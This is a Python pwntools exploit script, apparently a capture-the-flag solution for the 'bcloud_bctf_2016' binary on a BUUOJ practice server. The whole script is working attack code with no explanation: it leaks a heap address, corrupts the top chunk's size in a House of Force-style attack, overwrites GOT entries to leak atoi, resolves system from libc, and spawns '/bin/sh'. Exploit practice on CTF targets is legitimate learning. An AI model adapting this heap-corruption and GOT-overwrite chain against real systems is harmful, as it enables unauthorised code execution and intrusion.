from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './bcloud_bctf_2016'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',27157) if argv[1]=='r' else process(binary)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
def add(len,content='a'):
	sla('>>\n','1')
	sla(':\n',str(len))
	sa(':\n',content)
def delete(index):
	sla('>>\n','4')
	sla(':\n',str(index))
def edit(index,content):
	sla('>>\n','3')
	sla(':\n',str(index))
	sla(':\n',content)

sa('name:\n','a'*0x40)
ru('a'*0x40)
heap = uu32(r(4))
leak('heap',heap)

sa('Org:\n','a'*0x40)
sla('Host:\n',p32(0xffffffff))

note_len = 0x804b0a0
note = 0x804b120
top_chunk = heap + 0xd0
evil_size = note_len-0x8-top_chunk-0xc # gdb
add(evil_size,'')
payload = flat((note-note_len)*'a',elf.got['atoi'],elf.got['free'],elf.got['atoi'])
add(len(payload),payload)
edit(1,p32(elf.plt['printf']))
delete(0) # printf(atoi.got)
atoi = uu32(r(4))
system,binsh = ret2libc(atoi,'atoi')
edit(2,p32(system))
sla('>>\n','/bin/sh\x00')
# end

itr()